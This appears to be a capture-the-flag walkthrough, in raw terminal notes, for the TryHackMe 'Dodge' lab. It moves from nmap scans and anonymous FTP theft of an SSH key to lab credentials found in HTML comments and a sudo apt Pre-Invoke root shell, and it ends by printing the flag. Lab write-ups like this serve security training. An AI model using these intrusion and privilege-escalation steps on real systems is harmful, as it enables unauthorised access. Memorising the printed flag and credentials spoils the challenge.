<code>
  
https://tryhackme.com/r/room/dodge

### Service Enumeration

┌──(duke㉿kali)-[~/Documents/THM_DOdge]
└─$ nmap  -sV -Pn -p-  10.10.128.143
Starting Nmap 7.92 ( https://nmap.org ) at 2024-06-17 06:19 CDT
Nmap scan report for 10.10.128.143
Host is up (0.042s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.41
443/tcp open  ssl/http Apache httpd 2.4.41
Service Info: Hosts: default, ip-10-10-128-143.eu-west-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 196.05 seconds
                                                                

### in cert found vhost

dodge.thm    403
www.dodge.thm
blog.dodge.thm 403
touch-me-not.dodge.thm
dev.dodge.thm /serverstatus
netops-dev.dodge.thm - Firewall - Upload Logs - chech source
ball.dodge.thm 403


### Enable ftp service via link

https://netops-dev.dodge.thm/firewall10110.php
                                                                                                                                                                                                                                          
┌──(duke㉿kali)-[~]
└─$ nmap  -sV -p 21 dodge.thm
Starting Nmap 7.92 ( https://nmap.org ) at 2024-06-17 07:06 CDT
Nmap scan report for dodge.thm (10.10.128.143)
Host is up (0.039s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
Service Info: Host: Dodge

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.47 seconds


### on FTP found private ssh key
                                                                                                                                                                                                                                            
┌──(duke㉿kali)-[~]
└─$ ftp anonymous@dodge.thm                                                                                  
Connected to dodge.thm.
220 Welcome to Dodge FTP service
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||20740|)
ftp: Can't connect to `10.10.128.143:20740': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-r--------    1 1003     1003           38 Jun 19  2023 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
200 EPRT command successful. Consider using EPSV.
550 Failed to open file.
ftp> cat user.txt

ftp> ls -al\
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    5 1003     1003         4096 Jun 29  2023 .
drwxr-xr-x    5 1003     1003         4096 Jun 29  2023 ..
-rwxr-xr-x    1 1003     1003           87 Jun 29  2023 .bash_history
-rwxr-xr-x    1 1003     1003          220 Feb 25  2020 .bash_logout
-rwxr-xr-x    1 1003     1003         3771 Feb 25  2020 .bashrc
drwxr-xr-x    2 1003     1003         4096 Jun 19  2023 .cache
drwxr-xr-x    3 1003     1003         4096 Jun 19  2023 .local
-rwxr-xr-x    1 1003     1003          807 Feb 25  2020 .profile
drwxr-xr-x    2 1003     1003         4096 Jun 22  2023 .ssh
-r--------    1 1003     1003           38 Jun 19  2023 user.txt
226 Directory send OK.
ftp> cd .ssh
250 Directory successfully changed.
ftp> ls -al\
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 1003     1003         4096 Jun 22  2023 .
drwxr-xr-x    5 1003     1003         4096 Jun 29  2023 ..
-rwxr-xr-x    1 1003     1003          573 Jun 22  2023 authorized_keys
-r--------    1 1003     1003         2610 Jun 22  2023 id_rsa
-rwxr-xr-x    1 1003     1003         2610 Jun 22  2023 id_rsa_backup
226 Directory send OK.
ftp> mget authorized_keys
mget authorized_keys [anpqy?]? y
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for authorized_keys (573 bytes).
100% |***********************************************************************************************************************************************************************************************|   573        1.44 MiB/s    00:00 ETA
226 Transfer complete.
573 bytes received in 00:00 (15.86 KiB/s)
ftp> 

ftp> mget id_rsa_backup
ftp: Can't connect to `10.10.181.61:58205': Connection timed out
mget id_rsa_backup [anpqy?]? y
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for id_rsa_backup (2610 bytes).
100% |***********************************************************************|  2610        7.42 MiB/s    00:00 ETA
226 Transfer complete.
2610 bytes received in 00:00 (69.13 KiB/s)


### Get ssh access as Challenger 

┌──(duke㉿kali)-[~/Documents/THM_DOdge]
└─$ ls -la 
total 20
drwxr-xr-x   2 duke duke 4096 Jun 18 03:04 .
drwxr--r-- 122 duke duke 4096 Jun 17 06:18 ..
-rw-r--r--   1 duke duke  573 Jun 22  2023 authorized_keys
-rw-r--r--   1 duke duke   87 Jun 29  2023 .bash_history
-r--------   1 duke duke 2610 Jun 22  2023 id_rsa_backup
                                                                                                                                                                                                                                            
┌──(duke㉿kali)-[~/Documents/THM_DOdge]
└─$ ssh -i id_rsa_backup challenger@dodge.thm
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.15.0-1039-aws x86_64)




challenger@thm-lamp:~$ ls -la
total 40
drwxr-xr-x 5 challenger challenger 4096 Jun 29  2023 .
drwxr-xr-x 6 root       root       4096 Jun 19  2023 ..
-rwxr-xr-x 1 challenger challenger   87 Jun 29  2023 .bash_history
-rwxr-xr-x 1 challenger challenger  220 Feb 25  2020 .bash_logout
-rwxr-xr-x 1 challenger challenger 3771 Feb 25  2020 .bashrc
drwxr-xr-x 2 challenger challenger 4096 Jun 19  2023 .cache
drwxr-xr-x 3 challenger challenger 4096 Jun 19  2023 .local
-rwxr-xr-x 1 challenger challenger  807 Feb 25  2020 .profile
drwxr-xr-x 2 challenger challenger 4096 Jun 22  2023 .ssh
-r-------- 1 challenger challenger   38 Jun 19  2023 user.txt
challenger@thm-lamp:~$ cd ..
challenger@thm-lamp:/home$ ls
challenger  cobra  tryhackme  ubuntu
challenger@thm-lamp:/home$ ls -la
total 24
drwxr-xr-x  6 root       root       4096 Jun 19  2023 .
drwxr-xr-x 19 root       root       4096 Jun 18 07:47 ..
drwxr-xr-x  5 challenger challenger 4096 Jun 29  2023 challenger
drwxr-xr-x  3 cobra      cobra      4096 Jun 20  2023 cobra
drwxr-xr-x  3 tryhackme  tryhackme  4096 Jun 13  2023 tryhackme
drwxr-xr-x  5 ubuntu     ubuntu     4096 Jun 22  2023 ubuntu
challenger@thm-lamp:/home$ cd cobra/
challenger@thm-lamp:/home/cobra$ ls
challenger@thm-lamp:/home/cobra$ ls -la
total 28
drwxr-xr-x 3 cobra cobra 4096 Jun 20  2023 .
drwxr-xr-x 6 root  root  4096 Jun 19  2023 ..
-rw------- 1 cobra cobra   13 Jun 26  2023 .bash_history
-rw-r--r-- 1 cobra cobra  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 cobra cobra 3771 Feb 25  2020 .bashrc
drwx------ 2 cobra cobra 4096 Jun 20  2023 .cache
-rw-r--r-- 1 cobra cobra  807 Feb 25  2020 .profile
challenger@thm-lamp:/home/cobra$ ls -la ../tryhackme/
total 24
drwxr-xr-x 3 tryhackme tryhackme 4096 Jun 13  2023 .
drwxr-xr-x 6 root      root      4096 Jun 19  2023 ..
lrwxrwxrwx 1 root      root         9 Nov 10  2021 .bash_history -> /dev/null
-rw-r--r-- 1 tryhackme tryhackme  220 Nov 10  2021 .bash_logout
-rw-r--r-- 1 tryhackme tryhackme 3771 Nov 10  2021 .bashrc
drwx------ 2 tryhackme tryhackme 4096 Jun 13  2023 .cache
-rw-r--r-- 1 tryhackme tryhackme  807 Nov 10  2021 .profile
challenger@thm-lamp:/home/cobra$ ls -la ../ubuntu/
total 40
drwxr-xr-x 5 ubuntu ubuntu 4096 Jun 22  2023 .
drwxr-xr-x 6 root   root   4096 Jun 19  2023 ..
-rw------- 1 ubuntu ubuntu  121 Nov 11  2021 .Xauthority
lrwxrwxrwx 1 root   root      9 Nov 10  2021 .bash_history -> /dev/null
-rw-r--r-- 1 ubuntu ubuntu  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu 3771 Feb 25  2020 .bashrc
drwx------ 2 ubuntu ubuntu 4096 Nov 10  2021 .cache
drwxrwxr-x 3 ubuntu ubuntu 4096 Jun 19  2023 .local
-rw-r--r-- 1 ubuntu ubuntu  807 Feb 25  2020 .profile
drwx------ 2 ubuntu ubuntu 4096 Jun 22  2023 .ssh
-rw-r--r-- 1 ubuntu ubuntu    0 Nov 10  2021 .sudo_as_admin_successful
-rw-rw-r-- 1 ubuntu ubuntu   56 Jun 22  2023 notes.txt
challenger@thm-lamp:/home/cobra$ cd ..
challenger@thm-lamp:/home$ cat ./ubuntu/notes.txt 
ALTER USER 'root'@'localhost' IDENTIFIED BY 'password';

tcp        0      0 127.0.0.1:10000         0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:35607         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -   

id=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),118(lxd)
uid=1001(tryhackme) gid=1001(tryhackme) groups=1001(tryhackme)
uid=1002(cobra) gid=1002(cobra) groups=1002(cobra)
uid=1003(challenger) gid=1003(challenger) groups=1003(challenger)

MYSQL_ROOT_PASSWORD=tiger
MYSQL_USER=docker
MYSQL_PASSWORD=docker
MYSQL_DATABASE=docker

╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                                                                                      
/home/tryhackme/.bash_history
/home/ubuntu/.bash_history
/root/
/var/www
/var/www/html_wwwcat 
/var/www/html_www/index.php
/var/www/notes
/var/www/www
/var/www/html
/var/www/default_html
/var/www/default_html/index.php

╔══════════╣ Unexpected in /opt (usually empty)
total 20                                                                                                                                                                                                                                    
drwxr-xr-x  5 root root 4096 Jun 29  2023 .
drwxr-xr-x 19 root root 4096 Jun 18 07:47 ..
drwx--x--x  4 root root 4096 Jun 22  2023 containerd
drwxr-xr-x  9 root root 4096 Jun 22  2023 docker-compose-lamp
drwxr-xr-x  2 root root 4096 Jun 29  2023 ssl

### Something run on port 10000

challenger@thm-lamp:/tmp$ ./nmap localhost

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-06-18 08:29 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00013s latency).
Not shown: 1177 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
10000/tcp open  webmin

### Forward local port out 

┌──(duke㉿kali)-[~/Documents/THM_DOdge]
└─$ ssh -v -L 10000:127.0.0.1:10000 challenger@dodge.thm -i id_rsa_backup 

Found MyNotes webpage in source found login credentials

  <!-- <input type="text" id="username" name="username" class="form-control" value="gabriela"> -->
            <input type="text" id="username" name="username" class="form-control">
        </div>
        <div class="form-group">
            <label for="password">Password:</label>
            <!-- <input type="password" id="password" name="password" class="form-control" value="^5hf5w&CAt9sPr@"> -->

### and after login cobra user credentials

My SSH login

## cobra / mz4%o7BGum#TTu

cobra@thm-lamp:~$ sudo -l
Matching Defaults entries for cobra on thm-lamp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cobra may run the following commands on thm-lamp:
    (ALL) NOPASSWD: /usr/bin/apt


## Get Root
cobra@thm-lamp:/tmp$ sudo -l
Matching Defaults entries for cobra on thm-lamp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cobra may run the following commands on thm-lamp:
    (ALL) NOPASSWD: /usr/bin/apt
cobra@thm-lamp:/tmp$ sudo /usr/bin/apt update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cd ..
# cd root
# ls
root.txt  snap
# cat root.txt
THM{7b88ac4f52cd8723a8d0c632c2d930ba}
# 




</code>
